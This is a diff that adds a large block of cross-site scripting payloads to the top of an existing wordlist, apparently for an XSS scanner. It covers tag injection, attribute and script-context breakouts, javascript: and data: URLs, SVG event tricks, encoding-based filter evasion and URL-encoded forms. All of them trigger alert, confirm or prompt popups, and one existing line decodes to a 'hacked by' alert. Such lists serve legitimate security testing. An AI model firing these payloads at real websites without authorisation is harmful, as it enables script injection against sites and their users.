@@ -1,3 +1,148 @@
+# === CURATED HIGH-SIGNAL XSS PAYLOADS - keep this block at the top ===
+# Raw HTML / DOM insertion
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+# Attribute breakout
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+` onmouseover=alert(1) x=`
+
+# Script/context breakout
+</script><svg onload=alert(1)>
+</script><img src=x onerror=alert(1)>
+";</script><svg onload=alert(1)>
+';</script><svg onload=alert(1)>
+";alert(1)//
+';alert(1)//
+\";alert(1)//
+\';alert(1)//
+-alert(1)-
+'-alert(1)-'
+"-alert(1)-"
+
+# URL / href / src contexts
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Interaction-triggered but browser-verifiable
+<x onclick=alert(1)>click</x>
+<x onmouseover=alert(1)>hover</x>
+<x onmousedown=alert(1)>down</x>
+<x onmouseup=alert(1)>up</x>
+<x ondblclick=alert(1)>double</x>
+<x oncontextmenu=alert(1)>menu</x>
+<x contenteditable onfocus=alert(1)>focus</x>
+<x contenteditable oninput=alert(1)>input</x>
+<x contenteditable onkeydown=alert(1)>key</x>
+<x contenteditable oncopy=alert(1)>copy</x>
+<x contenteditable oncut=alert(1)>cut</x>
+<x contenteditable onpaste=alert(1)>paste</x>
+
+# PortSwigger cheat-sheet inspired high-signal contexts
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>
+<svg><set onbegin=alert(1) attributeName=x to=y></set></svg>
+<svg><animateTransform onbegin=alert(1) attributeName=transform></animateTransform></svg>
+<svg><discard onbegin=alert(1)></discard></svg>
+<svg><a onmouseover=alert(1)>x</a></svg>
+<math><mtext><table><mglyph><style></math><img src=x onerror=alert(1)>
+<form><button formaction=javascript:alert(1)>x</button></form>
+<object data=javascript:alert(1)></object>
+<embed src=javascript:alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<iframe srcdoc='&lt;svg onload=alert(1)&gt;'></iframe>
+<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;"></iframe>
+<a href=javascript:alert(1)>x</a>
+<area href=javascript:alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)><option>x</option></select>
+<textarea autofocus onfocus=alert(1)>x</textarea>
+<keygen autofocus onfocus=alert(1)>
+<button autofocus onfocus=alert(1)>x</button>
+<div draggable=true ondragstart=alert(1)>drag</div>
+<div style=animation-name:x onanimationstart=alert(1)>x</div>
+<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>x</div>
+<video onloadedmetadata=alert(1)><source src=data:video/mp4;base64,AAAA></video>
+<audio onerror=alert(1) src=x></audio>
+<link rel=stylesheet href=data:text/css,body{} onload=alert(1)>
+<meta http-equiv=refresh content="0;javascript:alert(1)">
+
+# PortSwigger-style encoding and parser differentials
+<svg onload=&#97;lert(1)>
+<img src=x onerror=&#97;lert(1)>
+<svg onload=\u0061lert(1)>
+<img src=x onerror=\u0061lert(1)>
+<svg onload=\x61lert(1)>
+<img src=x onerror=\x61lert(1)>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<svg%09onload=alert(1)>
+<img%09src=x%09onerror=alert(1)>
+<svg%0Aonload=alert(1)>
+<img%0Asrc=x%0Aonerror=alert(1)>
+<svg%0Donload=alert(1)>
+<img%0Dsrc=x%0Donerror=alert(1)>
+<svg onload=alert`1`>
+<img src=x onerror=alert`1`>
+<svg onload=(alert)(1)>
+<img src=x onerror=(alert)(1)>
+<svg onload=top['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<svg onload=window['alert'](1)>
+<img src=x onerror=window['alert'](1)>
+
+# confirm/prompt variants for strict popup matching
+<svg onload=confirm('xss-search')>
+<img src=x onerror=confirm('xss-search')>
+"><svg onload=confirm('xss-search')>
+'</script><svg onload=confirm('xss-search')>
+<svg onload=prompt(8)>
+<img src=x onerror=prompt(8)>
+"><svg onload=prompt(8)>
+'><svg onload=prompt(8)>
+";prompt(8)//
+';prompt(8)//
+
+# URL-encoded equivalents of high-signal payloads
+%3Csvg%20onload%3Dalert%281%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3E%3Csvg%20onload%3Dalert%281%29%3E
+%27%3E%3Csvg%20onload%3Dalert%281%29%3E
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%20autofocus%20onfocus%3Dalert%281%29%20x%3D%22
+%27%20autofocus%20onfocus%3Dalert%281%29%20x%3D%27
+%3C%2Fscript%3E%3Csvg%20onload%3Dalert%281%29%3E
+%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3Balert%281%29%2F%2F
+%27%3Balert%281%29%2F%2F
+javascript%3Aalert%281%29
+data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Csvg%20onload%3Dconfirm%28%27xss-search%27%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dconfirm%28%27xss-search%27%29%3E
+%22%3E%3Csvg%20onload%3Dconfirm%28%27xss-search%27%29%3E
+%3Csvg%20onload%3Dprompt%288%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dprompt%288%29%3E
+%22%3E%3Csvg%20onload%3Dprompt%288%29%3E
+# === END CURATED HIGH-SIGNAL XSS PAYLOADS ===
+
 %27%3E%22%3Csvg%2Fonload=confirm%28%27xss-search%27%29%3E
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkIGJ5IGthbmcgcmFmYXNoYScpPC9zY3JpcHQ+
 "-prompt(8)-"
